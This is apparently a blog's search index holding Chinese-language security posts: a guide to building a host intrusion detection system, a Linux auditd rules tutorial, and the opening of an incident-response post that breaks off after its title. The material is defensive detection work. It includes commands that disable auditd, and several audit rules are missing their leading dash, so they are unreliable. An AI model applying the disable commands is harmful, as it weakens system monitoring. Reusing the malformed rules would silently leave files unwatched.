<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>HIDS建设经验总结</title>
    <url>/posts/11235/</url>
    <content><![CDATA[<center>本文总结HIDS自研建设的一些经验及研究心得，持续更新中...</center>

<span id="more"></span>

<h2 id="0x01-核心能力"><a href="#0x01-核心能力" class="headerlink" title="0x01 核心能力"></a>0x01 核心能力</h2><h3 id="1-数据采集能力"><a href="#1-数据采集能力" class="headerlink" title="1. 数据采集能力"></a>1. 数据采集能力</h3><p>Agent端做深入的数据采集(采集深度、数据上下文丰富度)，提高对抗成本</p>
<pre><code>1）内核态、用户态系统数据

2）容器层数据：Docker、Kubernetes

3）通用服务组件数据及日志：数据库、Web服务器、大数据组件、中间件、开发软件等
</code></pre>
<h3 id="2-检测分析能力"><a href="#2-检测分析能力" class="headerlink" title="2. 检测分析能力"></a>2. 检测分析能力</h3><p>能检测到什么程度的攻击(一般入侵 —&gt; 渗透测试 —&gt; 红队演练 —&gt; APT)</p>
<p><strong>核心能力</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 入侵对抗：基于网络攻杀链、ATT &amp; CK模型等各个阶段的攻击战术、技术、过程检测与响应</span><br><span class="line"></span><br><span class="line">2. 数据分析：基于特征(IOCs库、TTPs库)、图计算、入侵链路可视化分析、用户和实体行为分析、威胁智能分析、模型智能编排</span><br></pre></td></tr></table></figure>

<h2 id="0x02-考虑因素"><a href="#0x02-考虑因素" class="headerlink" title="0x02  考虑因素"></a>0x02  考虑因素</h2><h3 id="1-安全性"><a href="#1-安全性" class="headerlink" title="1. 安全性"></a>1. 安全性</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) Agent跟Server的配置下发通道安全，数据传输加密</span><br><span class="line"></span><br><span class="line">(2) 配置信息读取写入需要鉴权、配置变更历史需记录</span><br><span class="line"></span><br><span class="line">(3) 不预留包含任何命令执行的功能，服务端操作下发严格鉴权，保证agent低侵入性</span><br><span class="line"></span><br><span class="line">(4) agent更新时，对升级包的完整性进行检测验证，防止被攻击者替换</span><br><span class="line"></span><br><span class="line">(5) 通过system服务自启动、watch守护进程逆行监控，对异常agent下线进行监控和告警</span><br><span class="line"></span><br><span class="line">(6) Agent反调试、防逆向手段，提升攻击者对agent逆向分析难度</span><br></pre></td></tr></table></figure>

<h3 id="2-低损耗"><a href="#2-低损耗" class="headerlink" title="2. 低损耗"></a>2. 低损耗</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">节省资源，占用较少的CPU、内存；可使用cgroup等严格限制资源占用</span><br></pre></td></tr></table></figure>

<h3 id="3-稳定性"><a href="#3-稳定性" class="headerlink" title="3. 稳定性"></a>3. 稳定性</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">需保证agent长期运行稳定，确保agent本身不影响正常服务及业务</span><br></pre></td></tr></table></figure>

<h3 id="3-高可用"><a href="#3-高可用" class="headerlink" title="3. 高可用"></a>3. 高可用</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 需满足数十万服务器量级的IDC规模</span><br><span class="line"></span><br><span class="line">(2) 进程包活、心跳检测、实时获取新指令能力</span><br><span class="line"></span><br><span class="line">(3) 支持分布式部署，并行处理任务，保证数据的一致性，服务器数量规模达到百万级的集群负载能力</span><br></pre></td></tr></table></figure>

<h3 id="4-可控性"><a href="#4-可控性" class="headerlink" title="4. 可控性"></a>4. 可控性</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1) 精确的熔断限流，服务端命令下发响应需控制在分钟级以内</span><br><span class="line"></span><br><span class="line">(2) 服务端能控制agent的启动、终止，当agent出现异常时，也许保证可控</span><br></pre></td></tr></table></figure>

<h3 id="5-部署兼容性"><a href="#5-部署兼容性" class="headerlink" title="5. 部署兼容性"></a>5. 部署兼容性</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">需满足广泛的部署兼容性、兼容Linux各种版本、支持容器环境等</span><br></pre></td></tr></table></figure>

<h3 id="6-可扩展性"><a href="#6-可扩展性" class="headerlink" title="6. 可扩展性"></a>6. 可扩展性</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">系统功能增加、版本更新及维护较为方便，满足可扩展性</span><br></pre></td></tr></table></figure>

<h2 id="0x03-数据采集"><a href="#0x03-数据采集" class="headerlink" title="0x03 数据采集"></a>0x03 数据采集</h2><h3 id="1-采集维度"><a href="#1-采集维度" class="headerlink" title="1. 采集维度"></a>1. 采集维度</h3><p>依据安全需求、等保合规、威胁检测模型等梳理HIDS需要采集的数据维度、数据项…</p>
<p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/agent_data.png"></p>
<h3 id="2-技术方案"><a href="#2-技术方案" class="headerlink" title="2. 技术方案"></a>2. 技术方案</h3><p>总结业界成熟的主机入侵检测技术方案、开源项目核心模块…</p>
<p><strong>(1) eBPF</strong></p>
<ul>
<li><p><a href="https://www.kernel.org/doc/html/latest/networking/filter.html#networking-filter">eBPF</a> <em>Linux内核提供的一种扩展的BPF虚拟机，可用于获取内核运行信息</em></p>
</li>
<li><p><a href="https://www.kernel.org/doc/html/v4.16/userspace-api/seccomp_filter.html">Seccomp BPF</a> <em>使用BPF程序对任意系统调用及其参数进行过滤</em></p>
</li>
<li><p><a href="https://github.com/iovisor/bpftrace">bpftrace</a> <em>eBPF的高级跟踪语言，可实现内核动态跟踪（kprobes）,用户级动态跟踪（uprobes）</em></p>
</li>
</ul>
<p><strong>(2) Audit</strong></p>
<ul>
<li><p><a href="https://github.com/linux-audit">linux-audit</a> <em>Linux安全审计系统，可用于收集记录系统、内核、用户进程发生的行为事件</em></p>
</li>
<li><p><a href="https://github.com/slackhq/go-audit">go-audit</a> <em>Go实现的Linux audit类库，可替代auditd daemon</em></p>
</li>
<li><p><a href="https://github.com/elastic/go-libaudit">go-libaudit</a>  <em>go-libaudit是用于与Linux Audit Framework通信的库</em></p>
</li>
</ul>
<p><strong>(4) sysdig</strong></p>
<ul>
<li><a href="https://github.com/draios/sysdig">sysdig</a> <em>提供深层系统可见性的工具，可对容器进行访问</em></li>
</ul>
<p><strong>(5) Capsule8</strong></p>
<ul>
<li><a href="https://github.com/capsule8/">capsule8</a> <em>Linux系统及云环境实时威胁检测防护开源项目</em></li>
</ul>
<p><strong>(6) Osquery-events</strong></p>
<ul>
<li><a href="https://github.com/osquery/osquery/tree/experimental/osquery/events/linux">osquery-events</a> <em>Osquery事件监控模块，可持续监控系统事件变化情况</em></li>
</ul>
<p><strong>(7)elastic-auditbeat</strong></p>
<ul>
<li><a href="https://github.com/elastic/beats/tree/master/auditbeat">auditbeat</a> <em>用于收集Linux审计框架数据，对消息进行解析和标准化，并监测文件的完整性</em></li>
</ul>
<p><strong>(8) grsecurity</strong></p>
<ul>
<li><a href="https://grsecurity.net/download">grsecurity</a> <em>一个用于Linux内核的修补程序，为ACL系统提供了内核模块的支持</em></li>
</ul>
<p><strong>(9) snoopy</strong></p>
<ul>
<li><a href="https://github.com/a2o/snoopy">snoopy</a> <em>开源的轻量级lib库, 可以记录系统中所有执行过的命令和参数</em></li>
</ul>
<p><strong>(10) inotify-tools</strong></p>
<ul>
<li><a href="https://github.com/inotify-tools/inotify-tools">inotify-tools</a> <em>Linux文件系统事件监控工具套件</em></li>
</ul>
<p><strong>(11) Rootkit Detection</strong></p>
<ul>
<li><p><a href="https://github.com/nbulischeck/tyton">tyton</a> <em>Linux内核态rootkit检测工具</em></p>
</li>
<li><p><a href="https://www.openwall.com/lkrg/">LKRG</a> <em>Linux内核运行时防护工具</em></p>
</li>
<li><p><a href="http://www.unhide-forensics.info/?Linux">Unhide</a> <em>可用于检测隐藏进程</em></p>
</li>
<li><p><a href="http://rkhunter.sourceforge.net/">rkhunter</a> <em>Linux用户态rootkit检测工具</em></p>
</li>
</ul>
<h2 id="0x04-检测分析"><a href="#0x04-检测分析" class="headerlink" title="0x04 检测分析"></a>0x04 检测分析</h2><h3 id="1-检测模型"><a href="#1-检测模型" class="headerlink" title="1. 检测模型"></a>1. 检测模型</h3><p><img src="https://blog-1254410573.cos.ap-beijing.myqcloud.com/Image/threat_detection.png"></p>
<p><strong>Refer:</strong> <a href="https://help.aliyun.com/document_detail/191144.html">https://help.aliyun.com/document_detail/191144.html</a></p>
<h3 id="2-检测方法"><a href="#2-检测方法" class="headerlink" title="2. 检测方法"></a>2. 检测方法</h3><h4 id="a-误用检测方法"><a href="#a-误用检测方法" class="headerlink" title="a. 误用检测方法"></a>a. 误用检测方法</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 模式匹配法</span><br><span class="line"></span><br><span class="line">通过把收集到的信息与网络入侵和系统误用模式数据库中的已知信息进行比较，从而对违背安全策略的行为进行发现。模式匹配法可以显著地减少系统负担，有较高的检测率和准确率</span><br><span class="line"></span><br><span class="line">2) 专家系统法</span><br><span class="line"></span><br><span class="line">通过将安全专家的知识表示成IF-THEN规则，形成专家知识库，然后，运用推理算法进行检测入侵。专家系统的IF-THEN规则，就是由模式匹配规则组成，即”与或非组合模式匹配规则“，通过组合多个模式匹配规则，来获得单个模式匹配规则所无法取得的效果，主要是针对有特征的入侵行为</span><br><span class="line"></span><br><span class="line">3) 状态转移分析法</span><br><span class="line"></span><br><span class="line">该方法的基本思想是将攻击看成一个连续的、分步骤的并且各个步骤之间有一定的关联的过程。在网络中发生入侵时及时阻断入侵行为，防止可能还会进一步发生的类似攻击行为。在状态转移分析方法中，一个渗透过程可以看作是由攻击者做出的一系列的行为而导致系统从某个初始状态变为最终某个被危害的状态</span><br></pre></td></tr></table></figure>

<h4 id="b-异常检测方法"><a href="#b-异常检测方法" class="headerlink" title="b. 异常检测方法"></a>b. 异常检测方法</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 基于贝叶斯推理检测法</span><br><span class="line"></span><br><span class="line">通过在任何给定的时刻，测量变量值，推理判断系统是否发生入侵事件</span><br><span class="line"></span><br><span class="line">2) 基于特征选择检测法</span><br><span class="line"></span><br><span class="line">指从一组度量中挑选出能检测入侵的度量，用它来对入侵行为进行预测或分类</span><br><span class="line"></span><br><span class="line">3) 基于贝叶斯网络检测法</span><br><span class="line"></span><br><span class="line">用图形方式表示随机变量之间的关系。通过指定的与邻接节点相关一个小的概率集来计算随机变量的联接概率分布。按给定全部节点组合，所有根节点的先验概率和非根节点概率构成这个集。贝叶斯网络是一个有向图，弧表示父、子结点之间的依赖关系。当随机变量的值变为已知时，就允许将它吸收为证据，为其他的剩余随机变量条件值判断提供计算框架</span><br><span class="line"></span><br><span class="line">4) 基于模式预测的检测法</span><br><span class="line"></span><br><span class="line">事件序列不是随机发生的而是遵循某种可辨别的模式是基于模式预测的异常检测法的假设条件，其特点是事件序列及相互联系被考虑到了，只关心少数相关安全事件是该检测法的最大优点</span><br><span class="line"></span><br><span class="line">5) 基于统计的异常检测法</span><br><span class="line"></span><br><span class="line">根据用户对象的活动为每个用户都建立一个特征轮廓表，通过对当前特征与以前已经建立的特征进行比较，来判断当前行为的异常性。用户特征轮廓表要根据审计记录情况不断更新，其保护去多衡量指标，这些指标值要根据经验值或一段时间内的统计而得到</span><br><span class="line"></span><br><span class="line">6) 基于机器学习检测法</span><br><span class="line"></span><br><span class="line">根据离散数据临时序列学习获得网络、系统和个体的行为特征，并提出了一个实例学习法IBL，IBL是基于相似度，该方法通过新的序列相似度计算将原始数据（如离散事件流和无序的记录）转化成可度量的空间。然后，应用IBL学习技术和一种新的基于序列的分类方法，发现异常类型事件，从而检测入侵行为。其中，成员分类的概率由阈值的选取来决定</span><br><span class="line"></span><br><span class="line">7) 数据挖掘检测法</span><br><span class="line"></span><br><span class="line">数据挖掘的目的是要从海量的数据中提取出有用的数据信息。网络中会有大量的审计记录存在，审计记录大多都是以文件形式存放的。如果靠手工方法来发现记录中的异常现象是远远不够的，所以将数据挖掘技术应用于入侵检测中，可以从审计数据中提取有用的知识，然后用这些知识区检测异常入侵和已知的入侵。采用的方法有KDD算法，其优点是善于处理大量数据的能力与数据关联分析的能力，但是实时性较差</span><br><span class="line"></span><br><span class="line">8) 基于应用模式的异常检测法</span><br><span class="line"></span><br><span class="line">该方法是根据服务请求类型、服务请求长度、服务请求包大小分布计算网络服务的异常值。通过实时计算的异常值和所训练的阈值比较，从而发现异常行为</span><br><span class="line"></span><br><span class="line">9) 基于文本分类的异常检测法</span><br><span class="line"></span><br><span class="line">该方法是将系统产生的进程调用集合转换为“文档”。利用K邻聚类文本分类算法，计算文档的相似性</span><br></pre></td></tr></table></figure>

<h3 id="3-特征库"><a href="#3-特征库" class="headerlink" title="3. 特征库"></a>3. 特征库</h3><ul>
<li><p><a href="https://osintframework.com/">https://osintframework.com/</a></p>
</li>
<li><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a></p>
</li>
<li><p><a href="https://github.com/mitre-attack/attack-navigator">https://github.com/mitre-attack/attack-navigator</a></p>
</li>
<li><p><a href="https://virustotal.github.io/yara/">https://virustotal.github.io/yara/</a></p>
</li>
<li><p><a href="https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections">APT_CyberCriminal_Campagin_Collections</a></p>
</li>
<li><p><a href="https://github.com/smicallef/spiderfoot">https://github.com/smicallef/spiderfoot</a></p>
</li>
<li><p><a href="https://github.com/InQuest/awesome-yara">https://github.com/InQuest/awesome-yara</a></p>
</li>
<li><p><a href="https://github.com/sroberts/awesome-iocs">https://github.com/sroberts/awesome-iocs</a></p>
</li>
<li><p><a href="https://github.com/KasperskyLab/klara">https://github.com/KasperskyLab/klara</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>威胁检测</category>
      </categories>
      <tags>
        <tag>Threat Detection</tag>
        <tag>HIDS</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux安全之Audit审计</title>
    <url>/posts/18821/</url>
    <content><![CDATA[<center>本文记录Linux安全机制Audit审计框架及使用...</center>

<span id="more"></span>
<hr>
<h2 id="0x01-基本配置"><a href="#0x01-基本配置" class="headerlink" title="0x01 基本配置"></a>0x01 基本配置</h2><h3 id="1-配置文件"><a href="#1-配置文件" class="headerlink" title="1. 配置文件"></a>1. 配置文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/audit/audit.rules  # 审计规则文件</span><br></pre></td></tr></table></figure>
<h3 id="2-基本参数"><a href="#2-基本参数" class="headerlink" title="2. 基本参数"></a>2. 基本参数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-D        # 删除所有以前存在的规则</span><br><span class="line">-b 8192   # 设置用于容纳审计消息的缓冲区数目</span><br><span class="line">-f 1      # 设置当内核需要处理严重错误时要使用的故障标志。可能的值为 0（静默）、1（printk，列显故障消息）和 2（恐慌，暂停系统）</span><br></pre></td></tr></table></figure>
<h3 id="3-启动停止"><a href="#3-启动停止" class="headerlink" title="3. 启动停止"></a>3. 启动停止</h3><p>systemctl is-enabled auditd<br>systemctl disable auditd<br>systemctl stop auditd</p>
<h2 id="0x02-审计监测"><a href="#0x02-审计监测" class="headerlink" title="0x02 审计监测"></a>0x02 审计监测</h2><h3 id="1-监测审计日志及配置文件"><a href="#1-监测审计日志及配置文件" class="headerlink" title="1. 监测审计日志及配置文件"></a>1. 监测审计日志及配置文件</h3><p>添加审计配置文件和日志文件本身的监测项可确保您能够跟踪任何尝试篡改配置文件的操作，或检测任何尝试访问日志文件的操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-w /var/log/audit/               # 设置审计日志所在目录的监测项，对任何类型访问此目录的尝试均触发事件</span><br><span class="line">-w /var/log/audit/audit.log</span><br><span class="line"></span><br><span class="line">-w /var/log/audit/audit_log.1</span><br><span class="line">-w /var/log/audit/audit_log.2</span><br><span class="line">-w /var/log/audit/audit_log.3</span><br><span class="line">-w /var/log/audit/audit_log.4</span><br><span class="line"></span><br><span class="line">-w /etc/audit/auditd.conf -p wa  # 设置审计配置文件的监测项，记录对此文件的所有写入和属性更改尝试</span><br><span class="line">-w /etc/audit/audit.rules -p wa</span><br><span class="line">-w /etc/libaudit.conf -p wa</span><br></pre></td></tr></table></figure>
<h3 id="2-审计系统调用"><a href="#2-审计系统调用" class="headerlink" title="2. 审计系统调用"></a>2. 审计系统调用</h3><p>审计文件系统对象系统调用有助于跟踪高于应用程序级别的系统活动，发现异常系统调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1）审计文件系统系统调用</span><br><span class="line"></span><br><span class="line">-a entry,always -S chmod -S fchmod -S chown -S chown32 -S fchown -S fchown32 -S lchown -S lchown32  # 对更改文件所有权和权限相关的系统调用启用审计环境</span><br><span class="line"></span><br><span class="line">-a entry,always -S creat -S open -S truncate -S truncate64 -S ftruncate -S ftruncate64  # 对文件内容修改相关的系统调用启用审计环境</span><br><span class="line"></span><br><span class="line">-a entry,always -S mkdir -S rmdir  # 对任何目录操作（例如创建或去除目录）启用审计环境</span><br><span class="line"></span><br><span class="line">-a entry,always -S unlink -S rename -S link -S symlink  # 对任何链接操作（例如创建符号链接、创建链接、取消链接或重命名）启用审计环境</span><br><span class="line"></span><br><span class="line">-a entry,always -S setxattr   # 对扩展文件系统属性相关的任何操作启用审计环境。</span><br><span class="line">-a entry,always -S lsetxattr</span><br><span class="line">-a entry,always -S fsetxattr</span><br><span class="line">-a entry,always -S removexattr</span><br><span class="line">-a entry,always -S lremovexattr</span><br><span class="line">-a entry,always -S fremovexattr</span><br><span class="line"></span><br><span class="line">-a entry,always -S mknod    # 对用于创建特殊（设备）文件的 mknod 系统调用启用审计环境</span><br><span class="line"></span><br><span class="line">-a entry,always -S mount -S umount -S umount2  # 对任何装入或卸载操作启用审计环境: 对于 x86 体系结构，请禁用 umount 规则; 对于 Intel 64 体系结构，请禁用 umount2 规则</span><br><span class="line"></span><br><span class="line">2）审计其他系统调用</span><br><span class="line"></span><br><span class="line">-a entry,always -S clone -S fork -S vfork   # 跟踪任务创建</span><br><span class="line"></span><br><span class="line">-a entry,always -S umask   # 审计umask系统调用以跟踪进程是如何修改创建掩码</span><br><span class="line"></span><br><span class="line">-a entry,always -S adjtimex -S settimeofday   # 跟踪尝试更改系统时间的操作：使用adjtimex来调整时间，settimeofday会设置绝对时间</span><br></pre></td></tr></table></figure>
<h3 id="3-审计安全配置文件"><a href="#3-审计安全配置文件" class="headerlink" title="3. 审计安全配置文件"></a>3. 审计安全配置文件</h3><p>跟踪系统配置的更改（内核、服务、时间等）有助于发现他人尝试操纵您系统的基础功能的任何行为，适用于与安全身份验证和通讯相关的任何其他配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1）定时任务监测</span><br><span class="line"></span><br><span class="line">-w /var/spool/atspool        # at配置监测</span><br><span class="line">-w /etc/at.allow</span><br><span class="line">-w /etc/at.deny</span><br><span class="line"></span><br><span class="line">-w /etc/cron.allow -p wa     # cron配置监测</span><br><span class="line">-w /etc/cron.deny -p wa</span><br><span class="line">-w /etc/cron.d/ -p wa</span><br><span class="line">-w /etc/cron.daily/ -p wa</span><br><span class="line">-w /etc/cron.hourly/ -p wa</span><br><span class="line">-w /etc/cron.monthly/ -p wa</span><br><span class="line">-w /etc/cron.weekly/ -p wa</span><br><span class="line">-w /etc/crontab -p wa</span><br><span class="line">-w /var/spool/cron/root</span><br><span class="line"></span><br><span class="line">2）用户及登录监测</span><br><span class="line"></span><br><span class="line">-w /etc/group -p wa</span><br><span class="line">-w /etc/passwd -p wa</span><br><span class="line">-w /etc/shadow</span><br><span class="line"></span><br><span class="line">-w /etc/login.defs -p wa</span><br><span class="line">-w /etc/securetty</span><br><span class="line">-w /var/log/lastlog</span><br><span class="line"></span><br><span class="line">3）主机及系统配置监测</span><br><span class="line"></span><br><span class="line">-w /etc/hosts -p wa     # 静态主机名配置设置监测</span><br><span class="line">-w /etc/sysconfig/      # 系统配置目录监测</span><br><span class="line">w /etc/init.d/          # 引导配置监测</span><br><span class="line">w /etc/ld.so.conf -p wa # 链接器配置监测</span><br><span class="line">w /etc/localtime -p wa  # 本地时间监测</span><br><span class="line"></span><br><span class="line">w /etc/sysctl.conf -p wa # 内核配置监测</span><br><span class="line">w /etc/modprobe.d/</span><br><span class="line">w /etc/modprobe.conf.local -p wa</span><br><span class="line">w /etc/modprobe.conf -p wa</span><br><span class="line"></span><br><span class="line">4）PAM配置目录监测</span><br><span class="line"></span><br><span class="line">w /etc/pam.d/</span><br><span class="line"></span><br><span class="line">5）别名文件监测</span><br><span class="line"></span><br><span class="line">-w /etc/aliases -p wa</span><br><span class="line"></span><br><span class="line">6）SSH等配置文件监测</span><br><span class="line"></span><br><span class="line">-w /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line">-w /etc/stunnel/stunnel.conf</span><br><span class="line">-w /etc/stunnel/stunnel.pem</span><br><span class="line"></span><br><span class="line">-w /etc/vsftpd.ftpusers</span><br><span class="line">-w /etc/vsftpd.conf</span><br><span class="line"></span><br><span class="line">7）主机名设置及系统标识配置监测</span><br><span class="line"></span><br><span class="line">-a exit,always -S sethostname</span><br><span class="line">-w /etc/issue -p wa</span><br><span class="line">-w /etc/issue.net -p wa</span><br></pre></td></tr></table></figure>
<h3 id="4-过滤系统调用参数"><a href="#4-过滤系统调用参数" class="headerlink" title="4. 过滤系统调用参数"></a>4. 过滤系统调用参数</h3><p>审计系统调用会产生高负载的日志记录活动，而后者又会给内核带来繁重的负载，应用过滤器有助于将审计重点放在您主要关注的方面<br><strong>过滤非多路转换系统调用</strong><br>access 系统调用会检查是否允许某个进程读取、写入文件或文件系统对象或者测试该对象是否存在。请使用 -F 过滤标志以 -F a1&#x3D;ACCESS_MODE 格式构建与特定 access 调用匹配的规则。在 &#x2F;usr&#x2F;include&#x2F;fcntl.h 中检查 access 系统调用的可能参数列表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-a entry,always -S access -F a1=4  # 审计 access 系统调用，但仅当该系统调用的第二个参数 (mode) 为 4 (R_OK) 时会进行审计。此规则过滤所有用于测试对用户或进程所访问的文件或文件系统是否拥有足够读取权限的 access 调用</span><br><span class="line">-a entry,always -S access -F a1=6  # 审计 access 系统调用，但仅当该系统调用的第二个参数 (mode) 为 6（表示 4 OR 2，相当于 R_OK OR W_OK）时会进行审计。此规则过滤用于测试是否拥有足够读取和写入权限的 access 调用</span><br><span class="line">-a entry,always -S access -F a1=7  # 审计 access 系统调用，但仅当该系统调用的第二个参数 (mode) 为 7（表示 4 OR 2 OR 1，相当于 R_OK OR W_OK OR X_OK）时会进行审计。此规则过滤用于测试是否拥有足够读取、写入和执行权限的 access 调用</span><br></pre></td></tr></table></figure>

<p><strong>过滤多路转换系统调用</strong><br>socketcall 系统调用是多路转换系统调用。多路转换是指在所有可能的调用中只存在一个系统调用，并且 libc 会传递实际的系统调用作为第一个参数 (a0)。有关可能的参数值和系统调用名称的列表，请参见 &#x2F;usr&#x2F;src&#x2F;linux&#x2F;include&#x2F;linux&#x2F;net.h。审计支持使用 -F a0&#x3D;SYSCALL_NUMBER 过滤特定的系统调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-a entry,always -S socketcall -F a0=1 -F a1=10   # 审计 socket(PF_INET6) 系统调用。-F a0=1 过滤器会匹配所有 socket 系统调用，-F a1=10 过滤器可将匹配范围缩小为传递 IPv6 协议系列域参数 (PF_INET6) 的 socket 系统调用。有关第一个参数 (a0)，请查看 /usr/include/linux/net.h；有关第二个参数 (a1)，请查看 /usr/src/linux/include/linux/socket.h。AMD64/Intel 64 等 64 位平台不会对 socketcall 系统调用使用多路转换。对于这些平台，请将规则注释掉，并添加对 PF_INET6 进行过滤的普通系统调用规则</span><br><span class="line">## Use this line on x86_64, ia64 instead</span><br><span class="line">#-a entry,always -S socket -F a0=10</span><br><span class="line"></span><br><span class="line">-a entry,always -S socketcall -F a0=5           # 审计 socketcall 系统调用。过滤标志设置为过滤 a0=5（socketcall 的第一个参数），如果您检查 /usr/include/linux/net.h，会发现此设置转换为 accept 系统调用。AMD64/Intel 64 等 64 位平台不会对 socketcall 系统调用使用多路转换。对于这些平台，请将规则注释掉，并添加不含参数过滤的普通系统调用规则</span><br><span class="line">## Use this line on x86_64, ia64 instead</span><br><span class="line">#-a entry, always -S accept</span><br></pre></td></tr></table></figure>
<p>ipc 系统调用是多路转换系统调用的另一个示例。要调用的实际调用由传递给 ipc 系统调用的第一个参数决定。过滤这些参数有助于您将重点放在要关注的 IPC 调用上。在 &#x2F;usr&#x2F;include&#x2F;linux&#x2F;ipc.h 中查看可能的参数值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) 审计与 IPC SYSV 消息队列相关的系统调用</span><br><span class="line"></span><br><span class="line">a0 值指定要针对 msgctl 和 msgget 系统调用（14 和 13）添加审计。AMD64/Intel 64 等 64 位平台不会对 ipc 系统调用使用多路转换。对于这些平台，请将前两条规则注释掉，并添加不含参数过滤的普通系统调用规则</span><br><span class="line"></span><br><span class="line">## msgctl</span><br><span class="line">-a entry,always -S ipc -F a0=14</span><br><span class="line">## msgget</span><br><span class="line">-a entry,always -S ipc -F a0=13</span><br><span class="line">## Use these lines on x86_64, ia64 instead</span><br><span class="line">#-a entry,always -S msgctl</span><br><span class="line">#-a entry,always -S msgget</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2) 审计与 IPC SYSV 消息信号相关的系统调用</span><br><span class="line"></span><br><span class="line">a0 值指定要针对 semctl、semget、semop 和 semtimedop 系统调用（3、2、1 和 4）添加审计。AMD64/Intel 64 等 64 位平台不会对 ipc 系统调用使用多路转换。对于这些平台，请将前四条规则注释掉，并添加不含参数过滤的普通系统调用规则</span><br><span class="line"></span><br><span class="line">## semctl</span><br><span class="line">-a entry,always -S ipc -F a0=3</span><br><span class="line">## semget</span><br><span class="line">-a entry,always -S ipc -F a0=2</span><br><span class="line">## semop</span><br><span class="line">-a entry,always -S ipc -F a0=1</span><br><span class="line">## semtimedop</span><br><span class="line">-a entry,always -S ipc -F a0=4</span><br><span class="line">## Use these lines on x86_64, ia64 instead</span><br><span class="line">#-a entry,always -S semctl</span><br><span class="line">#-a entry,always -S semget</span><br><span class="line">#-a entry,always -S semop</span><br><span class="line">#-a entry,always -S semtimedop</span><br><span class="line"></span><br><span class="line">3) 审计与 IPC SYSV 共享内存相关的系统调用</span><br><span class="line"></span><br><span class="line">a0 值指定要针对 shmctl 和 shmget 系统调用（24 和 23）添加审计。AMD64/Intel 64 等 64 位平台不会对 ipc 系统调用使用多路转换。对于这些平台，请将前两条规则注释掉，并添加不含参数过滤的普通系统调用规则</span><br><span class="line"></span><br><span class="line">## shmctl</span><br><span class="line">-a entry,always -S ipc -F a0=24</span><br><span class="line">## shmget</span><br><span class="line">-a entry,always -S ipc -F a0=23</span><br><span class="line">## Use these lines on x86_64, ia64 instead</span><br><span class="line">#-a entry,always -S shmctl</span><br><span class="line">#-a entry,always -S shmget</span><br></pre></td></tr></table></figure>
<h3 id="5-使用键管理审计事件记录"><a href="#5-使用键管理审计事件记录" class="headerlink" title="5. 使用键管理审计事件记录"></a>5. 使用键管理审计事件记录</h3><p>使用 ausearch 命令可以根据不同的准则过滤日志。通过使用 ausearch -m MESSAGE_TYPE，可以过滤特定类型的事件。但是，要过滤与特定规则相关的事件，需要在 &#x2F;etc&#x2F;audit&#x2F;audit.rules 文件中将一个键添加到此规则。然后，每次该规则记录一个事件时，此键就会添加到相应事件记录。要检索这些日志项，只需运行 ausearch -k YOUR_KEY 获取与该规则相关且带有此特定键的记录列表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-w /etc/audit/audit.rules -p wa</span><br><span class="line"></span><br><span class="line">-w /etc/audit/audit.rules -p wa -k CFG_audit.rules  # 使用 -k 选项将一个键添加到上述规则</span><br><span class="line"></span><br><span class="line">查找记录：ausearch -k CFG_audit.rules</span><br></pre></td></tr></table></figure>
<p>可以指定任何文本字符串作为键。使用不同的键前缀（CFG、LOG 等）后接文件名来区分与不同文件类型（配置文件或日志文件）相关的各监测项</p>
<h2 id="0xFF-参考链接"><a href="#0xFF-参考链接" class="headerlink" title="0xFF 参考链接"></a>0xFF 参考链接</h2><ul>
<li><a href="https://documentation.suse.com/zh-cn/sled/15-SP3/html/SLED-all/cha-audit-scenarios.html">https://documentation.suse.com/zh-cn/sled/15-SP3/html/SLED-all/cha-audit-scenarios.html</a></li>
<li><a href="https://filippo.io/linux-syscall-table/">https://filippo.io/linux-syscall-table/</a></li>
<li><a href="https://github.com/Neo23x0/auditd/blob/master/audit.rules">https://github.com/Neo23x0/auditd/blob/master/audit.rules</a></li>
<li><a href="https://github.com/bfuzzy/auditd-attack/blob/master/auditd-attack.rules">https://github.com/bfuzzy/auditd-attack/blob/master/auditd-attack.rules</a></li>
<li><a href="https://github.com/set-element/auditdBroFramework/blob/master/system_config/audit.rules">https://github.com/set-element/auditdBroFramework/blob/master/system_config&#x2F;audit.rules</a></li>
<li><a href="https://github.com/linux-audit/audit-userspace/tree/master/rules">https://github.com/linux-audit/audit-userspace/tree/master/rules</a></li>
</ul>
]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Audit</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux应急响应进阶篇</title>
    <url>/posts/10124/</url>
    <content><![CDATA[<center>本文记录Linux环境应急响应的进阶及实战用法...</center>

<span id="more"></span>

